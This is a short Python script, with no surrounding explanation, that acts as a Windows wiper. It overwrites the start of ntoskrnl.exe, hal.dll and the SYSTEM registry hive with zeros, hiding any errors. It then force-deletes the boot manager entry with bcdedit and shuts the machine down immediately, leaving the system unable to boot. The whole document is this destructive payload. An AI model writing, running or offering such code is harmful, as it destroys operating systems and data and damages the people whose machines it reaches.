import subprocess
   
files = [
    "C:\\Windows\\System32\\ntoskrnl.exe", # Critical system file
    "C:\\Windows\\System32\\hal.dll", # Hardware Abstraction Layer
    "C:\\Windows\\System32\\config\\SYSTEM" # System registry hive
]

# Overwrite critical system files with zeros
for file in files:
    try:
        with open(file, 'wb') as f:
            f.write(b'\x00' * 1024) # Overwrite first 1KB with zeros
    except Exception:
        ...
    
try:
    # Force delete the boot manager entry
    subprocess.run(["bcdedit", "/delete", "{bootmgr}", "/f"], check=True)
except subprocess.CalledProcessError:
    ...

# Force system shutdown to trigger recovery mode
subprocess.run(["shutdown", "/s", "/t", "0"])